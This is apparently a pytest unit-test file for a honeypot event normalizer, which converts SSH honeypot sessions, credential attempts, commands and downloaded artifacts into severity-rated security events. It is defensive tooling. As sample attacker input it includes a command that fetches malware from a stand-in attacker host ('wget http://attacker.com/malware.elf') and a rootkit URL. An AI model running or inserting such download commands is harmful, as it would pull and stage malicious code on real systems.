"""
Unit tests for Honeypot Event Normalizer.
"""

from __future__ import annotations

import datetime

import pytest

from src.honeypot.models import (
    CommandRecord,
    CredentialAttempt,
    FileArtifact,
    HoneypotSession,
)
from src.honeypot.normalizer import (
    normalise_artifact_record,
    normalise_command_record,
    normalise_credential_attempt,
    normalise_session_to_event,
)
from src.shared.event_schema import SecurityEvent


@pytest.fixture
def sample_session() -> HoneypotSession:
    now = datetime.datetime.now(datetime.timezone.utc)
    return HoneypotSession(
        session_id="test-session-001",
        source_ip="198.51.100.44",
        source_port=49120,
        protocol="ssh",
        target_host="honeypot-ssh-01",
        start_time=now,
        authenticated=True,
        authenticated_user="root",
    )


def test_normalise_credential_attempt(sample_session: HoneypotSession):
    attempt = CredentialAttempt(
        username="admin",
        password="secretpassword",
        success=False,
        source_ip=sample_session.source_ip,
    )
    event = normalise_credential_attempt(sample_session, attempt)

    assert isinstance(event, SecurityEvent)
    assert event.source == "honeypot"
    assert event.event_type == "honeypot_auth_failure"
    assert event.severity == "medium"
    assert event.entity.ip == "198.51.100.44"
    assert event.entity.user == "admin"
    assert event.raw["password"] == "secretpassword"
    assert "T1110" in event.enrichment["mitre_attack"]


def test_normalise_command_record_low_risk(sample_session: HoneypotSession):
    cmd = CommandRecord(
        command="whoami",
        output_preview="root",
        tags=["recon"],
    )
    event = normalise_command_record(sample_session, cmd)

    assert isinstance(event, SecurityEvent)
    assert event.source == "honeypot"
    assert event.event_type == "honeypot_command"
    assert event.severity == "medium"
    assert event.entity.user == "root"
    assert "recon" in event.raw["tags"]


def test_normalise_command_record_high_risk(sample_session: HoneypotSession):
    cmd = CommandRecord(
        command="wget http://attacker.com/malware.elf",
        tags=["download"],
    )
    event = normalise_command_record(sample_session, cmd)

    assert event.severity == "high"  # download category bumps severity to high
    assert event.raw["command"] == "wget http://attacker.com/malware.elf"


def test_normalise_artifact_record(sample_session: HoneypotSession):
    art = FileArtifact(
        filename_or_url="http://attacker.com/rootkit.sh",
        file_hash="9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
        size_bytes=4096,
        transfer_type="download",
    )
    event = normalise_artifact_record(sample_session, art)

    assert event.source == "honeypot"
    assert event.event_type == "honeypot_payload_download"
    assert event.severity == "high"
    assert event.entity.hash == "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
    assert "T1105" in event.enrichment["mitre_attack"]


def test_normalise_session_to_event(sample_session: HoneypotSession):
    sample_session.commands.append(CommandRecord(command="uname -a", tags=["recon"]))
    sample_session.artifacts.append(FileArtifact(filename_or_url="payload.bin", file_hash="abc123hash"))
    sample_session.close()

    event = normalise_session_to_event(sample_session)

    assert event.source == "honeypot"
    assert event.event_type == "honeypot_session"
    assert event.severity == "high"
    assert event.entity.ip == "198.51.100.44"
    assert event.entity.user == "root"
    assert event.entity.hash == "abc123hash"
    assert event.raw["commands_count"] == 1
    assert event.raw["artifacts_count"] == 1
